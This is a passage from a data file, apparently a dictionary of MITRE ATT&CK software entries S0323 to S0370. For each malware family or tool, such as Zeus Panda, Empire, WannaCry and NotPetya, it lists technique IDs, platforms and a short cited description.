 'S0323': {'attack_ids': ['T1406', 'T1432', 'T1430', 'T1446'],
           'description': '[Charger](https://attack.mitre.org/software/S0323) is Android malware that steals steals '
                          "contacts and SMS messages from the user's device. It can also lock the device and demand "
                          'ransom payment if it receives admin permissions. (Citation: CheckPoint-Charger)',
           'name': 'Charger',
           'platforms': ['Android'],
           'software_id': 'S0323',
           'type': 'malware'},
 'S0324': {'attack_ids': ['T1433',
                          'T1438',
                          'T1400',
                          'T1422',
                          'T1512',
                          'T1432',
                          'T1412',
                          'T1402',
                          'T1404',
                          'T1513',
                          'T1407',
                          'T1429',
                          'T1409',
                          'T1430'],
           'description': '[SpyDealer](https://attack.mitre.org/software/S0324) is Android malware that exfiltrates '
                          'sensitive data from Android devices. (Citation: PaloAlto-SpyDealer)',
           'name': 'SpyDealer',
           'platforms': ['Android'],
           'software_id': 'S0324',
           'type': 'malware'},
 'S0325': {'attack_ids': ['T1472', 'T1407'],
           'description': '[Judy](https://attack.mitre.org/software/S0325) is auto-clicking adware that was '
                          'distributed through multiple apps in the Google Play Store. (Citation: CheckPoint-Judy)',
           'name': 'Judy',
           'platforms': ['Android'],
           'software_id': 'S0325',
           'type': 'malware'},
 'S0326': {'attack_ids': ['T1422', 'T1426', 'T1429', 'T1448', 'T1437', 'T1476'],
           'description': '[RedDrop](https://attack.mitre.org/software/S0326) is an Android malware family that '
                          'exfiltrates sensitive data from devices. (Citation: Wandera-RedDrop)',
           'name': 'RedDrop',
           'platforms': ['Android'],
           'software_id': 'S0326',
           'type': 'malware'},
 'S0327': {'attack_ids': ['T1438', 'T1512', 'T1404', 'T1407', 'T1429', 'T1437', 'T1409', 'T1430'],
           'description': '[Skygofree](https://attack.mitre.org/software/S0327) is Android spyware that is believed to '
                          'have been developed in 2014 and used through at least 2017. (Citation: Kaspersky-Skygofree)',
           'name': 'Skygofree',
           'platforms': ['Android'],
           'software_id': 'S0327',
           'type': 'malware'},
 'S0328': {'attack_ids': ['T1433',
                          'T1438',
                          'T1422',
                          'T1512',
                          'T1412',
                          'T1432',
                          'T1435',
                          'T1474',
                          'T1533',
                          'T1429',
                          'T1418',
                          'T1430',
                          'T1456'],
           'description': '[Stealth Mango](https://attack.mitre.org/software/S0328) is Android malware that has '
                          'reportedly been used to successfully compromise the mobile devices of government officials, '
                          'members of the military, medical professionals, and civilians. The iOS malware known as '
                          '[Tangelo](https://attack.mitre.org/software/S0329) is believed to be from the same '
                          'developer. (Citation: Lookout-StealthMango)',
           'name': 'Stealth Mango',
           'platforms': ['Android'],
           'software_id': 'S0328',
           'type': 'malware'},
 'S0329': {'attack_ids': ['T1433', 'T1422', 'T1412', 'T1533', 'T1429', 'T1409', 'T1430'],
           'description': '[Tangelo](https://attack.mitre.org/software/S0329) is iOS malware that is believed to be '
                          'from the same developers as the [Stealth Mango](https://attack.mitre.org/software/S0328) '
                          'Android malware. It is not a mobile application, but rather a Debian package that can only '
                          'run on jailbroken iOS devices. (Citation: Lookout-StealthMango)',
           'name': 'Tangelo',
           'platforms': ['iOS'],
           'software_id': 'S0329',
           'type': 'malware'},
 'S0330': {'attack_ids': ['T1055',
                          'T1059',
                          'T1140',
                          'T1056',
                          'T1082',
                          'T1070',
                          'T1086',
                          'T1012',
                          'T1124',
                          'T1107',
                          'T1057',
                          'T1064',
                          'T1083',
                          'T1105',
                          'T1071',
                          'T1027',
                          'T1112',
                          'T1113',
                          'T1060',
                          'T1179',
                          'T1063',
                          'T1115'],
           'description': '[Zeus Panda](https://attack.mitre.org/software/S0330) is a Trojan designed to steal banking '
                          'information and other sensitive credentials for exfiltration. [Zeus '
                          'Panda](https://attack.mitre.org/software/S0330)’s original source code was leaked in 2011, '
                          'allowing threat actors to use its source code as a basis for new malware variants. It is '
                          'mainly used to target Windows operating systems ranging from Windows XP through Windows '
                          '10.(Citation: Talos Zeus Panda Nov 2017)(Citation: GDATA Zeus Panda June 2017)',
           'name': 'Zeus Panda',
           'platforms': ['Windows'],
           'software_id': 'S0330',
           'type': 'malware'},
 'S0331': {'attack_ids': ['T1087',
                          'T1203',
                          'T1056',
                          'T1082',
                          'T1022',
                          'T1048',
                          'T1065',
                          'T1124',
                          'T1125',
                          'T1016',
                          'T1057',
                          'T1105',
                          'T1071',
                          'T1027',
                          'T1060',
                          'T1113',
                          'T1089',
                          'T1033',
                          'T1115'],
           'description': '[Agent Tesla](https://attack.mitre.org/software/S0331) is a spyware Trojan written in '
                          'visual basic.(Citation: Fortinet Agent Tesla April 2018)',
           'name': 'Agent Tesla',
           'platforms': ['Windows'],
           'software_id': 'S0331',
           'type': 'malware'},
 'S0332': {'attack_ids': ['T1125',
                          'T1055',
                          'T1027',
                          'T1112',
                          'T1056',
                          'T1090',
                          'T1060',
                          'T1113',
                          'T1064',
                          'T1088',
                          'T1123',
                          'T1083',
                          'T1497',
                          'T1105',
                          'T1115',
                          'T1059'],
           'description': '[Remcos](https://attack.mitre.org/software/S0332) is a closed-source tool that is marketed '
                          'as a remote control and surveillance software by a company called Breaking Security. '
                          '[Remcos](https://attack.mitre.org/software/S0332) has been observed being used in malware '
                          'campaigns.(Citation: Riskiq Remcos Jan 2018)(Citation: Talos Remcos Aug 2018)',
           'name': 'Remcos',
           'platforms': ['Windows'],
           'software_id': 'S0332',
           'type': 'tool'},
 'S0333': {'attack_ids': ['T1071', 'T1094', 'T1027', 'T1197', 'T1043', 'T1057', 'T1102', 'T1497', 'T1105', 'T1059'],
           'description': '[UBoatRAT](https://attack.mitre.org/software/S0333) is a remote access tool that was '
                          'identified in May 2017.(Citation: PaloAlto UBoatRAT Nov 2017)',
           'name': 'UBoatRAT',
           'platforms': ['Windows'],
           'software_id': 'S0333',
           'type': 'malware'},
 'S0334': {'attack_ids': ['T1071',
                          'T1125',
                          'T1076',
                          'T1112',
                          'T1056',
                          'T1082',
                          'T1060',
                          'T1057',
                          'T1045',
                          'T1064',
                          'T1036',
                          'T1089',
                          'T1123',
                          'T1033',
                          'T1105',
                          'T1115',
                          'T1059'],
           'description': '[DarkComet](https://attack.mitre.org/software/S0334) is a Windows remote administration '
                          'tool and backdoor.(Citation: TrendMicro DarkComet Sept 2014)(Citation: Malwarebytes '
                          'DarkComet March 2018)',
           'name': 'DarkComet',
           'platforms': ['Windows'],
           'software_id': 'S0334',
           'type': 'malware'},
 'S0335': {'attack_ids': ['T1095',
                          'T1140',
                          'T1124',
                          'T1018',
                          'T1016',
                          'T1055',
                          'T1087',
                          'T1074',
                          'T1027',
                          'T1053',
                          'T1057',
                          'T1043',
                          'T1048',
                          'T1012',
                          'T1049',
                          'T1050'],
           'description': '[Carbon](https://attack.mitre.org/software/S0335) is a sophisticated, second-stage backdoor '
                          'and framework that can be used to steal sensitive information from victims. '
                          '[Carbon](https://attack.mitre.org/software/S0335) has been selectively used by '
                          '[Turla](https://attack.mitre.org/groups/G0010) to target government and foreign '
                          'affairs-related organizations in Central Asia.(Citation: ESET Carbon Mar 2017)(Citation: '
                          'Securelist Turla Oct 2018)',
           'name': 'Carbon',
           'platforms': ['Windows'],
           'software_id': 'S0335',
           'type': 'malware'},
 'S0336': {'attack_ids': ['T1027',
                          'T1016',
                          'T1112',
                          'T1032',
                          'T1125',
                          'T1056',
                          'T1060',
                          'T1064',
                          'T1089',
                          'T1123',
                          'T1065',
                          'T1105',
                          'T1059'],
           'description': '[NanoCore](https://attack.mitre.org/software/S0336) is a modular remote access tool '
                          'developed in .NET that can be used to spy on victims and steal information. It has been '
                          'used by threat actors since 2013.(Citation: DigiTrust NanoCore Jan 2017)(Citation: Cofense '
                          'NanoCore Mar 2018)(Citation: PaloAlto NanoCore Feb 2016)(Citation: Unit 42 Gorgon Group Aug '
                          '2018)',
           'name': 'NanoCore',
           'platforms': ['Windows'],
           'software_id': 'S0336',
           'type': 'malware'},
 'S0337': {'attack_ids': ['T1071',
                          'T1074',
                          'T1056',
                          'T1082',
                          'T1060',
                          'T1005',
                          'T1043',
                          'T1113',
                          'T1083',
                          'T1063',
                          'T1497',
                          'T1105'],
           'description': '[BadPatch](https://attack.mitre.org/software/S0337) is a Windows Trojan that was used in a '
                          'Gaza Hackers-linked campaign.(Citation: Unit 42 BadPatch Oct 2017)',
           'name': 'BadPatch',
           'platforms': ['Windows'],
           'software_id': 'S0337',
           'type': 'malware'},
 'S0338': {'attack_ids': ['T1071', 'T1125', 'T1056', 'T1060', 'T1113', 'T1001', 'T1123', 'T1059'],
           'description': '[Cobian RAT](https://attack.mitre.org/software/S0338) is a backdoor, remote access tool '
                          'that has been observed since 2016.(Citation: Zscaler Cobian Aug 2017)',
           'name': 'Cobian RAT',
           'platforms': ['Windows'],
           'software_id': 'S0338',
           'type': 'malware'},
 'S0339': {'attack_ids': ['T1047',
                          'T1071',
                          'T1027',
                          'T1063',
                          'T1023',
                          'T1056',
                          'T1082',
                          'T1113',
                          'T1123',
                          'T1083',
                          'T1119',
                          'T1002',
                          'T1033',
                          'T1105',
                          'T1158',
                          'T1059'],
           'description': '[Micropsia](https://attack.mitre.org/software/S0339) is a remote access tool written in '
                          'Delphi.(Citation: Talos Micropsia June 2017)(Citation: Radware Micropsia July 2018)',
           'name': 'Micropsia',
           'platforms': ['Windows'],
           'software_id': 'S0339',
           'type': 'malware'},
 'S0340': {'attack_ids': ['T1047', 'T1071', 'T1016', 'T1082', 'T1132', 'T1113', 'T1083', 'T1033', 'T1105'],
           'description': '[Octopus](https://attack.mitre.org/software/S0340) is a Windows Trojan.(Citation: '
                          'Securelist Octopus Oct 2018)',
           'name': 'Octopus',
           'platforms': ['Windows'],
           'software_id': 'S0340',
           'type': 'malware'},
 'S0341': {'attack_ids': ['T1110',
                          'T1071',
                          'T1203',
                          'T1016',
                          'T1485',
                          'T1486',
                          'T1060',
                          'T1064',
                          'T1046',
                          'T1117',
                          'T1102',
                          'T1086',
                          'T1170',
                          'T1168',
                          'T1105'],
           'description': '[Xbash](https://attack.mitre.org/software/S0341) is a malware family that has targeted '
                          'Linux and Microsoft Windows servers. The malware has been tied to the Iron Group, a threat '
                          'actor group known for previous ransomware attacks. '
                          '[Xbash](https://attack.mitre.org/software/S0341) was developed in Python and then converted '
                          'into a self-contained Linux ELF executable by using PyInstaller.(Citation: Unit42 Xbash '
                          'Sept 2018)',
           'name': 'Xbash',
           'platforms': ['Windows', 'Linux'],
           'software_id': 'S0341',
           'type': 'malware'},
 'S0342': {'attack_ids': ['T1071',
                          'T1003',
                          'T1107',
                          'T1055',
                          'T1027',
                          'T1032',
                          'T1112',
                          'T1085',
                          'T1056',
                          'T1007',
                          'T1031',
                          'T1045',
                          'T1188',
                          'T1116',
                          'T1105',
                          'T1059'],
           'description': '[GreyEnergy](https://attack.mitre.org/software/S0342) is a backdoor written in C and '
                          'compiled in Visual Studio. [GreyEnergy](https://attack.mitre.org/software/S0342) shares '
                          'similarities with the [BlackEnergy](https://attack.mitre.org/software/S0089) malware and is '
                          'thought to be the successor of it.(Citation: ESET GreyEnergy Oct 2018)',
           'name': 'GreyEnergy',
           'platforms': ['Windows'],
           'software_id': 'S0342',
           'type': 'malware'},
 'S0343': {'attack_ids': ['T1074', 'T1112', 'T1036', 'T1064', 'T1022', 'T1002', 'T1050', 'T1059'],
           'description': '[Exaramel for Windows](https://attack.mitre.org/software/S0343) is a backdoor used for '
                          'targeting Windows systems. The Linux version is tracked separately under [Exaramel for '
                          'Linux](https://attack.mitre.org/software/S0401).(Citation: ESET TeleBots Oct 2018)',
           'name': 'Exaramel for Windows',
           'platforms': ['Windows'],
           'software_id': 'S0343',
           'type': 'malware'},
 'S0344': {'attack_ids': ['T1140',
                          'T1124',
                          'T1134',
                          'T1016',
                          'T1107',
                          'T1032',
                          'T1082',
                          'T1503',
                          'T1081',
                          'T1057',
                          'T1093',
                          'T1113',
                          'T1083',
                          'T1012',
                          'T1033',
                          'T1105'],
           'description': '[Azorult](https://attack.mitre.org/software/S0344) is a commercial Trojan that is used to '
                          'steal information from compromised hosts. '
                          '[Azorult](https://attack.mitre.org/software/S0344) has been observed in the wild as early '
                          'as 2016.\n'
                          'In July 2018, [Azorult](https://attack.mitre.org/software/S0344) was seen used in a '
                          'spearphishing campaign against targets in North America. '
                          '[Azorult](https://attack.mitre.org/software/S0344) has been seen used for cryptocurrency '
                          'theft. (Citation: Unit42 Azorult Nov 2018)(Citation: Proofpoint Azorult July 2018)',
           'name': 'Azorult',
           'platforms': ['Windows'],
           'software_id': 'S0344',
           'type': 'malware'},
 'S0345': {'attack_ids': ['T1071',
                          'T1094',
                          'T1107',
                          'T1027',
                          'T1060',
                          'T1057',
                          'T1036',
                          'T1083',
                          'T1050',
                          'T1105',
                          'T1059'],
           'description': '[Seasalt](https://attack.mitre.org/software/S0345) is malware that has been linked to '
                          "[APT1](https://attack.mitre.org/groups/G0006)'s 2010 operations. It shares some code "
                          'similarities with [OceanSalt](https://attack.mitre.org/software/S0346).(Citation: Mandiant '
                          'APT1 Appendix)(Citation: McAfee Oceansalt Oct 2018)',
           'name': 'Seasalt',
           'platforms': ['Windows'],
           'software_id': 'S0345',
           'type': 'malware'},
 'S0346': {'attack_ids': ['T1016', 'T1107', 'T1082', 'T1132', 'T1043', 'T1057', 'T1064', 'T1083', 'T1193', 'T1059'],
           'description': '[OceanSalt](https://attack.mitre.org/software/S0346) is a Trojan that was used in a '
                          'campaign targeting victims in South Korea, United States, and Canada. '
                          '[OceanSalt](https://attack.mitre.org/software/S0346) shares code similarity with [SpyNote '
                          'RAT](https://attack.mitre.org/software/S0305), which has been linked to '
                          '[APT1](https://attack.mitre.org/groups/G0006).(Citation: McAfee Oceansalt Oct 2018)',
           'name': 'OceanSalt',
           'platforms': ['Windows'],
           'software_id': 'S0346',
           'type': 'malware'},
 'S0347': {'attack_ids': ['T1140', 'T1107', 'T1027', 'T1055', 'T1090', 'T1043', 'T1083', 'T1050', 'T1105', 'T1059'],
           'description': '[AuditCred](https://attack.mitre.org/software/S0347) is a malicious DLL that has been used '
                          'by [Lazarus Group](https://attack.mitre.org/groups/G0032) during their 2018 '
                          'attacks.(Citation: TrendMicro Lazarus Nov 2018)',
           'name': 'AuditCred',
           'platforms': ['Windows'],
           'software_id': 'S0347',
           'type': 'malware'},
 'S0348': {'attack_ids': ['T1024',
                          'T1055',
                          'T1002',
                          'T1204',
                          'T1059',
                          'T1140',
                          'T1056',
                          'T1090',
                          'T1082',
                          'T1500',
                          'T1012',
                          'T1107',
                          'T1057',
                          'T1083',
                          'T1105',
                          'T1071',
                          'T1027',
                          'T1112',
                          'T1008',
                          'T1060',
                          'T1113',
                          'T1043',
                          'T1033'],
           'description': '[Cardinal RAT](https://attack.mitre.org/software/S0348) is a potentially low volume remote '
                          'access trojan (RAT) observed since December 2015. [Cardinal '
                          'RAT](https://attack.mitre.org/software/S0348) is notable for its unique utilization of '
                          'uncompiled C# source code and the Microsoft Windows built-in csc.exe compiler.(Citation: '
                          'PaloAlto CardinalRat Apr 2017)',
           'name': 'Cardinal RAT',
           'platforms': ['Windows'],
           'software_id': 'S0348',
           'type': 'malware'},
 'S0349': {'attack_ids': ['T1503', 'T1081', 'T1003'],
           'description': '[LaZagne](https://attack.mitre.org/software/S0349) is a post-exploitation, open-source tool '
                          'used to recover stored passwords on a system. It has modules for Windows, Linux, and OSX, '
                          'but is mainly focused on Windows systems. '
                          '[LaZagne](https://attack.mitre.org/software/S0349) is publicly available on '
                          'GitHub.(Citation: GitHub LaZagne Dec 2018)',
           'name': 'LaZagne',
           'platforms': ['Linux', 'macOS', 'Windows'],
           'software_id': 'S0349',
           'type': 'tool'},
 'S0350': {'attack_ids': ['T1077',
                          'T1107',
                          'T1076',
                          'T1016',
                          'T1112',
                          'T1082',
                          'T1053',
                          'T1083',
                          'T1033',
                          'T1050',
                          'T1059'],
           'description': '[zwShell](https://attack.mitre.org/software/S0350) is a remote access tool (RAT) written in '
                          'Delphi that has been used by [Night '
                          'Dragon](https://attack.mitre.org/groups/G0014).(Citation: McAfee Night Dragon)',
           'name': 'zwShell',
           'platforms': ['Windows'],
           'software_id': 'S0350',
           'type': 'malware'},
 'S0351': {'attack_ids': ['T1071',
                          'T1004',
                          'T1124',
                          'T1082',
                          'T1113',
                          'T1057',
                          'T1041',
                          'T1083',
                          'T1065',
                          'T1033',
                          'T1105'],
           'description': '[Cannon](https://attack.mitre.org/software/S0351) is a Trojan with variants written in C# '
                          'and Delphi. It was first observed in April 2018. (Citation: Unit42 Cannon Nov '
                          '2018)(Citation: Unit42 Sofacy Dec 2018)',
           'name': 'Cannon',
           'platforms': ['Windows'],
           'software_id': 'S0351',
           'type': 'malware'},
 'S0352': {'attack_ids': ['T1159',
                          'T1027',
                          'T1107',
                          'T1158',
                          'T1082',
                          'T1045',
                          'T1064',
                          'T1022',
                          'T1497',
                          'T1105',
                          'T1160',
                          'T1059'],
           'description': '[OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) is a MacOS backdoor that has '
                          'been used by [APT32](https://attack.mitre.org/groups/G0050).(Citation: TrendMicro MacOS '
                          'April 2018)',
           'name': 'OSX_OCEANLOTUS.D',
           'platforms': ['macOS'],
           'software_id': 'S0352',
           'type': 'malware'},
 'S0353': {'attack_ids': ['T1140',
                          'T1071',
                          'T1124',
                          'T1016',
                          'T1027',
                          'T1085',
                          'T1107',
                          'T1074',
                          'T1082',
                          'T1060',
                          'T1036',
                          'T1179',
                          'T1033',
                          'T1105'],
           'description': '[NOKKI](https://attack.mitre.org/software/S0353) is a modular remote access tool. The '
                          'earliest observed attack using [NOKKI](https://attack.mitre.org/software/S0353) was in '
                          'January 2018. [NOKKI](https://attack.mitre.org/software/S0353) has significant code overlap '
                          'with the [KONNI](https://attack.mitre.org/software/S0356) malware family. There is some '
                          'evidence potentially linking [NOKKI](https://attack.mitre.org/software/S0353) to '
                          '[APT37](https://attack.mitre.org/groups/G0067).(Citation: Unit 42 NOKKI Sept '
                          '2018)(Citation: Unit 42 Nokki Oct 2018)',
           'name': 'NOKKI',
           'platforms': ['Windows'],
           'software_id': 'S0353',
           'type': 'malware'},
 'S0354': {'attack_ids': ['T1140',
                          'T1071',
                          'T1107',
                          'T1016',
                          'T1055',
                          'T1027',
                          'T1082',
                          'T1132',
                          'T1073',
                          'T1043',
                          'T1064',
                          'T1083',
                          'T1012',
                          'T1002',
                          'T1033',
                          'T1105',
                          'T1059'],
           'description': '[Denis](https://attack.mitre.org/software/S0354) is a Windows backdoor and '
                          'Trojan.(Citation: Cybereason Oceanlotus May 2017)',
           'name': 'Denis',
           'platforms': ['Windows'],
           'software_id': 'S0354',
           'type': 'malware'},
 'S0355': {'attack_ids': ['T1140', 'T1071', 'T1027', 'T1082', 'T1060', 'T1057'],
           'description': '[Final1stspy](https://attack.mitre.org/software/S0355) is a dropper family that has been '
                          'used to deliver [DOGCALL](https://attack.mitre.org/software/S0213).(Citation: Unit 42 Nokki '
                          'Oct 2018)',
           'name': 'Final1stspy',
           'platforms': ['Windows'],
           'software_id': 'S0355',
           'type': 'malware'},
 'S0356': {'attack_ids': ['T1071',
                          'T1003',
                          'T1107',
                          'T1016',
                          'T1023',
                          'T1056',
                          'T1082',
                          'T1503',
                          'T1060',
                          'T1113',
                          'T1036',
                          'T1086',
                          'T1083',
                          'T1033',
                          'T1105',
                          'T1115',
                          'T1059'],
           'description': '[KONNI](https://attack.mitre.org/software/S0356) is a Windows remote administration too '
                          'that has been seen in use since 2014 and evolved in its capabilities through at least 2017. '
                          '[KONNI](https://attack.mitre.org/software/S0356) has been linked to several campaigns '
                          'involving North Korean themes.(Citation: Talos Konni May 2017) '
                          '[KONNI](https://attack.mitre.org/software/S0356) has significant code overlap with the '
                          '[NOKKI](https://attack.mitre.org/software/S0353) malware family. There is some evidence '
                          'potentially linking [KONNI](https://attack.mitre.org/software/S0356) to '
                          '[APT37](https://attack.mitre.org/groups/G0067).(Citation: Unit 42 NOKKI Sept '
                          '2018)(Citation: Unit 42 Nokki Oct 2018)',
           'name': 'KONNI',
           'platforms': ['Windows'],
           'software_id': 'S0356',
           'type': 'malware'},
 'S0357': {'attack_ids': ['T1047', 'T1003', 'T1040', 'T1171', 'T1208', 'T1035'],
           'description': '[Impacket](https://attack.mitre.org/software/S0357) is an open source collection of modules '
                          'written in Python for programmatically constructing and manipulating network protocols. '
                          '[Impacket](https://attack.mitre.org/software/S0357) contains several tools for remote '
                          'service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and '
                          'relay attacks.(Citation: Impacket Tools)',
           'name': 'Impacket',
           'platforms': ['Linux', 'macOS', 'Windows'],
           'software_id': 'S0357',
           'type': 'tool'},
 'S0358': {'attack_ids': ['T1114', 'T1137'],
           'description': '[Ruler](https://attack.mitre.org/software/S0358) is a tool to abuse Microsoft Exchange '
                          'services. It is publicly available on GitHub and the tool is executed via the command line. '
                          'The creators of [Ruler](https://attack.mitre.org/software/S0358) have also released a '
                          'defensive tool, NotRuler, to detect its usage.(Citation: SensePost Ruler GitHub)(Citation: '
                          'SensePost NotRuler)',
           'name': 'Ruler',
           'platforms': ['Windows'],
           'software_id': 'S0358',
           'type': 'tool'},
 'S0359': {'attack_ids': ['T1482', 'T1018', 'T1016'],
           'description': '[Nltest](https://attack.mitre.org/software/S0359) is a Windows command-line utility used to '
                          'list domain controllers and enumerate domain trusts.(Citation: Nltest Manual)',
           'name': 'Nltest',
           'platforms': ['Windows'],
           'software_id': 'S0359',
           'type': 'tool'},
 'S0360': {'attack_ids': ['T1071', 'T1483', 'T1053', 'T1086', 'T1143', 'T1105', 'T1059'],
           'description': '[BONDUPDATER](https://attack.mitre.org/software/S0360) is a PowerShell backdoor used by '
                          '[OilRig](https://attack.mitre.org/groups/G0049). It was first observed in November 2017 '
                          'during targeting of a Middle Eastern government organization, and an updated version was '
                          'observed in August 2018 being used to target a government organization with spearphishing '
                          'emails.(Citation: FireEye APT34 Dec 2017)(Citation: Palo Alto OilRig Sep 2018)',
           'name': 'BONDUPDATER',
           'platforms': ['Windows'],
           'software_id': 'S0360',
           'type': 'malware'},
 'S0361': {'attack_ids': ['T1140', 'T1105', 'T1096'],
           'description': '[Expand](https://attack.mitre.org/software/S0361) is a Windows utility used to expand one '
                          'or more compressed CAB files.(Citation: Microsoft Expand Utility) It has been used by '
                          '[BBSRAT](https://attack.mitre.org/software/S0127) to decompress a CAB file into executable '
                          'content.(Citation: Palo Alto Networks BBSRAT)',
           'name': 'Expand',
           'platforms': ['Windows'],
           'software_id': 'S0361',
           'type': 'tool'},
 'S0362': {'attack_ids': ['T1110', 'T1156', 'T1132', 'T1043', 'T1133', 'T1033', 'T1078'],
           'description': '[Linux Rabbit](https://attack.mitre.org/software/S0362) is malware that targeted Linux '
                          'servers and IoT devices in a campaign lasting from August to October 2018. It shares code '
                          'with another strain of malware known as Rabbot. The goal of the campaign was to install '
                          'cryptocurrency miners onto the targeted servers and devices.(Citation: Anomali Linux Rabbit '
                          '2018)\n',
           'name': 'Linux Rabbit',
           'platforms': ['Linux'],
           'software_id': 'S0362',
           'type': 'malware'},
 'S0363': {'attack_ids': ['T1075',
                          'T1055',
                          'T1087',
                          'T1175',
                          'T1217',
                          'T1032',
                          'T1053',
                          'T1482',
                          'T1106',
                          'T1034',
                          'T1101',
                          'T1002',
                          'T1059',
                          'T1047',
                          'T1040',
                          'T1068',
                          'T1056',
                          'T1082',
                          'T1171',
                          'T1503',
                          'T1038',
                          'T1021',
                          'T1102',
                          'T1086',
                          'T1048',
                          'T1099',
                          'T1031',
                          'T1097',
                          'T1134',
                          'T1016',
                          'T1003',
                          'T1125',
                          'T1127',
                          'T1484',
                          'T1057',
                          'T1114',
                          'T1064',
                          'T1046',
                          'T1088',
                          'T1135',
                          'T1210',
                          'T1083',
                          'T1035',
                          'T1105',
                          'T1071',
                          'T1178',
                          'T1136',
                          'T1027',
                          'T1145',
                          'T1081',
                          'T1060',
                          'T1043',
                          'T1113',
                          'T1208',
                          'T1015',
                          'T1041',
                          'T1179',
                          'T1063',
                          'T1049',
                          'T1115',
                          'T1023'],
           'description': '[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote '
                          'administration and post-exploitation framework that is publicly available on GitHub. While '
                          'the tool itself is primarily written in Python, the post-exploitation agents are written in '
                          'pure [PowerShell](https://attack.mitre.org/techniques/T1086) for Windows and Python for '
                          'Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools '
                          'singled out by a joint report on public hacking tools being widely used by '
                          'adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell '
                          'Empire)(Citation: GitHub ATTACK Empire)\n'
                          '\n',
           'name': 'Empire',
           'platforms': ['Linux', 'macOS', 'Windows'],
           'software_id': 'S0363',
           'type': 'tool'},
 'S0364': {'attack_ids': ['T1485', 'T1487', 'T1488'],
           'description': '[RawDisk](https://attack.mitre.org/software/S0364) is a legitimate commercial driver from '
                          'the EldoS Corporation that is used for interacting with files, disks, and partitions. The '
                          "driver allows for direct modification of data on a local computer's hard drive. In some "
                          'cases, the tool can enact these raw disk modifications from user-mode processes, '
                          'circumventing Windows operating system security features.(Citation: EldoS RawDisk '
                          'ITpro)(Citation: Novetta Blockbuster Destructive Malware)',
           'name': 'RawDisk',
           'platforms': ['Windows'],
           'software_id': 'S0364',
           'type': 'tool'},
 'S0365': {'attack_ids': ['T1047',
                          'T1077',
                          'T1018',
                          'T1016',
                          'T1003',
                          'T1485',
                          'T1081',
                          'T1490',
                          'T1529',
                          'T1135',
                          'T1070',
                          'T1489',
                          'T1035',
                          'T1105'],
           'description': '[Olympic Destroyer](https://attack.mitre.org/software/S0365) is malware that was first seen '
                          'infecting computer systems at the 2018 Winter Olympics, held in Pyeongchang, South Korea. '
                          'The main purpose of the malware appears to be to cause destructive impact to the affected '
                          'systems. The malware leverages various native Windows utilities and API calls to carry out '
                          'its destructive tasks. The malware has worm-like features to spread itself across a '
                          'computer network in order to maximize its destructive impact.(Citation: Talos Olympic '
                          'Destroyer 2018) ',
           'name': 'Olympic Destroyer',
           'platforms': ['Windows'],
           'software_id': 'S0365',
           'type': 'malware'},
 'S0366': {'attack_ids': ['T1047',
                          'T1222',
                          'T1018',
                          'T1024',
                          'T1016',
                          'T1076',
                          'T1158',
                          'T1210',
                          'T1490',
                          'T1188',
                          'T1079',
                          'T1486',
                          'T1083',
                          'T1489',
                          'T1120',
                          'T1105',
                          'T1050'],
           'description': '[WannaCry](https://attack.mitre.org/software/S0366) is ransomware that was first seen in a '
                          'global attack during May 2017, which affected more than 150 countries. It contains '
                          'worm-like features to spread itself across a computer network using the SMBv1 exploit '
                          'EternalBlue.(Citation: LogRhythm WannaCry)(Citation: US-CERT WannaCry 2017)(Citation: '
                          'Washington Post WannaCry 2017)(Citation: FireEye WannaCry 2017)',
           'name': 'WannaCry',
           'platforms': ['Windows'],
           'software_id': 'S0366',
           'type': 'malware'},
 'S0367': {'attack_ids': ['T1094',
                          'T1055',
                          'T1032',
                          'T1053',
                          'T1204',
                          'T1059',
                          'T1110',
                          'T1047',
                          'T1040',
                          'T1022',
                          'T1086',
                          'T1065',
                          'T1050',
                          'T1077',
                          'T1003',
                          'T1057',
                          'T1114',
                          'T1064',
                          'T1192',
                          'T1210',
                          'T1027',
                          'T1060',
                          'T1043',
                          'T1045',
                          'T1081',
                          'T1041',
                          'T1193',
                          'T1078'],
           'description': '[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is '
                          'primarily used as a downloader for other malware variants such as '
                          '[TrickBot](https://attack.mitre.org/software/S0266) and IcedID. Emotet first emerged in '
                          'June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro '
                          'Banking Malware Jan 2019)',
           'name': 'Emotet',
           'platforms': ['Windows'],
           'software_id': 'S0367',
           'type': 'malware'},
 'S0368': {'attack_ids': ['T1195',
                          'T1047',
                          'T1077',
                          'T1003',
                          'T1085',
                          'T1053',
                          'T1486',
                          'T1036',
                          'T1529',
                          'T1070',
                          'T1210',
                          'T1035',
                          'T1078'],
           'description': '[NotPetya](https://attack.mitre.org/software/S0368) is malware that was first seen in a '
                          'worldwide attack starting on June 27, 2017. The main purpose of the malware appeared to be '
                          'to effectively destroy data and disk structures on compromised systems. Though '
                          '[NotPetya](https://attack.mitre.org/software/S0368) presents itself as a form of '
                          'ransomware, it appears likely that the attackers never intended to make the encrypted data '
                          'recoverable. As such, [NotPetya](https://attack.mitre.org/software/S0368) may be more '
                          'appropriately thought of as a form of wiper malware. '
                          '[NotPetya](https://attack.mitre.org/software/S0368) contains worm-like features to spread '
                          'itself across a computer network using the SMBv1 exploits EternalBlue and '
                          'EternalRomance.(Citation: Talos Nyetya June 2017)(Citation: Talos Nyetya June '
                          '2017)(Citation: US-CERT NotPetya 2017)',
           'name': 'NotPetya',
           'platforms': ['Windows'],
           'software_id': 'S0368',
           'type': 'malware'},
 'S0369': {'attack_ids': ['T1159', 'T1140', 'T1027', 'T1064', 'T1144', 'T1065', 'T1105', 'T1158', 'T1059'],
           'description': '[CoinTicker](https://attack.mitre.org/software/S0369) is a malicious application that poses '
                          'as a cryptocurrency price ticker and installs components of the open source backdoors '
                          'EvilOSX and EggShell.(Citation: CoinTicker 2019)',
           'name': 'CoinTicker',
           'platforms': ['macOS'],
           'software_id': 'S0369',
           'type': 'malware'},
 'S0370': {'attack_ids': ['T1009', 'T1107', 'T1027', 'T1064', 'T1486'],
           'description': '[SamSam](https://attack.mitre.org/software/S0370) is ransomware that appeared in early '
                          '2016. Unlike some ransomware, its variants have required operators to manually interact '
                          'with the malware to execute some of its core components.(Citation: US-CERT SamSam '
                          '2018)(Citation: Talos SamSam Jan 2018)(Citation: Sophos SamSam Apr 2018)(Citation: Symantec '
                          'SamSam Oct 2018)',
           'name': 'SamSam',
           'platforms': ['Windows'],
